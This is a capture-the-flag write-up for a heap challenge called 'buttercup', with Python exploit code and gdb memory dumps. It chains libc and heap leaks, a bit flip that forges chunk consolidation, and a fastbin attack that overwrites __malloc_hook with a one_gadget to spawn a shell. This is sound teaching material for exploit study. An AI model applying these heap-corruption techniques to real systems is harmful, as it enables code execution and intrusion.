```
Points:   300
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

### Summary

```
1) Add
2) Delete
3) Edit
4) View
5) Change author
6) Exit
```

Menu driven pwnable. Heap stuff it is. Let's get down to recon.

#### _Add_

We enter the size of the requested chunk and an index so that it gets stored in an array of pointers called `table` which is created dynamically
via `malloc`. The same index is used to store the size of the allocated chunk in an array of ints called `sizes` which is also created
dynamically via `malloc`. `add` doesn't read in input during allocation, meaning in the case of free-ing a small chunk and re-allocating it,
we'll be able to leak the libc pointers pointing to `main_arena`.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/butter_add.png)

#### _Remove_

The binary free's the pointer depending on the provided index and then zeros out the entry as well.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/butter_del.png)

#### _Edit_

Reads in the amount of bytes which were requested during allocation into the heap chunk.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/butter_edit.png)

#### _Flip_

That's where the bug lies. We can provide an address and `flip` the **lsb** (least significant bit) of the content it's pointing to. You'll see what I mean soon.

![img](https://github.com/xerof4ks/heapwn/blob/master/InCTF/img/butter_flip.png)

### Exploitation Analysis

Since this pwnable shouts loud and clear that it's heap related, the `flip` function exists for a specific reason. We'll probably
have to (at least that's what I did) turn off the lsb of a heap chunk's `size` field in order to fool it into thinking that
the previous chunk is free. First order of business, leaks. Let's kick it with the libc one.

```python
alloc(0x88, 0)
alloc(0x68, 1)
alloc(0x68, 2)	
alloc(0x88, 3)
# Prevent top chunk consolidation
alloc(0x68, 4)	
```

```
0x555555757100:	0x0000000000000000	0x0000000000000091 <-- chunk 0
0x555555757110:	0x0000000000000000	0x0000000000000000
0x555555757120:	0x0000000000000000	0x0000000000000000
0x555555757130:	0x0000000000000000	0x0000000000000000
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000000000000000	0x0000000000000000
0x555555757190:	0x0000000000000000	0x0000000000000071 <-- chunk 1
0x5555557571a0:	0x0000000000000000	0x0000000000000000
0x5555557571b0:	0x0000000000000000	0x0000000000000000
0x5555557571c0:	0x0000000000000000	0x0000000000000000
0x5555557571d0:	0x0000000000000000	0x0000000000000000
0x5555557571e0:	0x0000000000000000	0x0000000000000000
0x5555557571f0:	0x0000000000000000	0x0000000000000000
0x555555757200:	0x0000000000000000	0x0000000000000071 <-- chunk 2
0x555555757210:	0x0000000000000000	0x0000000000000000
0x555555757220:	0x0000000000000000	0x0000000000000000
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000000
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000091 <-- chunk 3
```

By freeing `chunk 0`, it will be placed in the unsorted bin list with its FD/BK fields pointing to `main arena` (libc that is). Now,
if we re-allocate the same chunk by making an allocation of the exact same size, we will get it back and since `add` asks for no
input during allocation we will be able to leak the `main arena` pointer.

```python
free(0)
alloc(0x88, 0)

libc    = libcLeak() - 0x3c4b78
mhook   = libc + 0x3c4b10
oneshot = libc + 0xf1117
log.success("Libc:          0x{:x}".format(libc))
log.success("__malloc_hook: 0x{:x}".format(mhook))
```

Off to the heap leak now. Thank to `add` once again, we can get a heap leak this time by free-ing two fast chunks.

```python
# We can get a heap leak by free-ing two fast chunks
free(1)
free(2)
```

```
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x555555757200 --> 0x555555757190 --> 0x0
(0x80)     fastbin[6]: 0x0
				  top: 0x555555757300 (size : 0x20d00) 
       last_remainder: 0x0 (size : 0x0) 
			unsortbin: 0x0

0x555555757190:	0x0000000000000090	0x0000000000000071 <-- chunk 1
0x5555557571a0:	0x0000000000000000	0x0000000000000000
0x5555557571b0:	0x0000000000000000	0x0000000000000000
0x5555557571c0:	0x0000000000000000	0x0000000000000000
0x5555557571d0:	0x0000000000000000	0x0000000000000000
0x5555557571e0:	0x0000000000000000	0x0000000000000000
0x5555557571f0:	0x0000000000000000	0x0000000000000000
0x555555757200:	0x0000000000000000	0x0000000000000071 <-- chunk 2
0x555555757210:	0x0000555555757190	0x0000000000000000
```


```python
heap   = heapLeak() & 0xFFFFFFFFFFFFF000
target = heap + 0x278
log.success("Heap:          0x{:x}".format(heap))
```

Now it's time to create the set up so that we can trigger a consolidation which will result in a chunk overlap.

```python
edit(2, p64(0)*12 + p64(0x170))
	
free(0)

# Flip the bit and fool the chunk that its
# previous chunk is free'd so that we can overlap
flip(str(target))
```

```
0x555555757100:	0x0000000000000000	0x0000000000000091 <-- chunk 0 (free)
0x555555757110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757120:	0x0000000000000000	0x0000000000000000
0x555555757130:	0x0000000000000000	0x0000000000000000
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000000000000000	0x0000000000000000
0x555555757190:	0x0000000000000090	0x0000000000000070 <-- chunk 1 (free)
0x5555557571a0:	0x0000000000000000	0x0000000000000000
0x5555557571b0:	0x0000000000000000	0x0000000000000000
0x5555557571c0:	0x0000000000000000	0x0000000000000000
0x5555557571d0:	0x0000000000000000	0x0000000000000000
0x5555557571e0:	0x0000000000000000	0x0000000000000000
0x5555557571f0:	0x0000000000000000	0x0000000000000000
0x555555757200:	0x0000000000000000	0x0000000000000071 <-- chunk 2 (in use)
0x555555757210:	0x0000000000000000	0x0000000000000000
0x555555757220:	0x0000000000000000	0x0000000000000000
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000000
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000170	0x0000000000000090 <-- chunk 3 (in use & previous chunk at 0x555555757100)
```

We've edited `chunk 2` such that the `prev_size` field of `chunk 3` will fool it (once `chunk 3` is free'd) into thinking that the
previous chunk **isn't** in use and it's **0x170** bytes before. All that is left is to free `chunk 3`, `malloc` will coalesce `chunk 3` and `chunk 0` and the resulting consolidated chunk will be big enough to overlap with `chunk 1` which is free.

Both `unlink` checks are bypassed:

```c
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");	
```

```python
free(3)
```

```
0x555555757100:	0x0000000000000000	0x0000000000000201 <-- chunk 0 (free)
0x555555757110:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757120:	0x0000000000000000	0x0000000000000000
0x555555757130:	0x0000000000000000	0x0000000000000000
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000000000000000	0x0000000000000000
0x555555757190:	0x0000000000000090	0x0000000000000070 <-- chunk 1 (free)
0x5555557571a0:	0x0000000000000000	0x0000000000000000


(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x555555757190 (overlap chunk with 0x555555757100(freed) )
(0x80)     fastbin[6]: 0x0
                  top: 0x555555757370 (size : 0x20c90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x555555757100 (size : 0x200)
```

`chunk 0` is in the unsorted list. If we request a big enough allocation (and less than 0x200 - 0x10 size), we will be able to overlap the newly allocated chunk with the fastbin chunk at `0x555555757190`. We can leverage this overlap into performing a fastbin attack and finally overwrite `__malloc_hook` with `one_gadget`.

```
0x555555757100:	0x0000000000000000	0x0000000000000111 <-- new chunk
0x555555757110:	0x0000000000000000	0x0000000000000000
0x555555757120:	0x0000000000000000	0x0000000000000000
0x555555757130:	0x0000000000000000	0x0000000000000000
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000000000000000	0x0000000000000000
0x555555757190:	0x0000000000000070	0x0000000000000070 <-- chunk 1 (free & overwrote FD field)
0x5555557571a0:	0x00007ffff7dd1aed	0x0000000000000000

(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x555555757190 --> 0x7ffff7dd1aed (size error (0x78)) --> 0xfff7a92e20000000 (invaild memory)
(0x80)     fastbin[6]: 0x0
```

Now with two allocation of size `0x68` we will get back `0x00007ffff7dd1aed` which will allow us to overwrite `__malloc_hook`. 

```python
# malloc will return 0x555555757190
alloc(0x68, 6)
# malloc will return 0x00007ffff7dd1aed
alloc(0x68, 7)
# __malloc_hook => one gadget
edit(7,"H"*0x13+p64(oneshot))
```

```
gdb-peda$ x/gx &__malloc_hook
0x7ffff7dd1b10 <__malloc_hook>:	0x00007ffff7afe117
gdb-peda$ x/5i 0x00007ffff7afe117
   0x7ffff7afe117 <exec_comm+2263>:	mov    rax,QWORD PTR [rip+0x2d2d9a]        # 0x7ffff7dd0eb8
   0x7ffff7afe11e <exec_comm+2270>:	lea    rsi,[rsp+0x70]
   0x7ffff7afe123 <exec_comm+2275>:	lea    rdi,[rip+0x9bbed]        # 0x7ffff7b99d17
   0x7ffff7afe12a <exec_comm+2282>:	mov    rdx,QWORD PTR [rax]
   0x7ffff7afe12d <exec_comm+2285>:	call   0x7ffff7ad9770 <execve>
```

`__malloc_hook` is officially overwritten and by calling `malloc`, it will trigger `__malloc_hook` and we will be greeted with a shell.

```
[+] Libc:          0x7fa5b5957000
[+] __malloc_hook: 0x7fa5b5d1bb10
[+] Heap:          0x55fc941d9000
[*] Switching to interactive mode
$ whoami
buttercup
$ ls
$ cat flag
inctf{nulls_nulls_3v3rywh3r3}
```
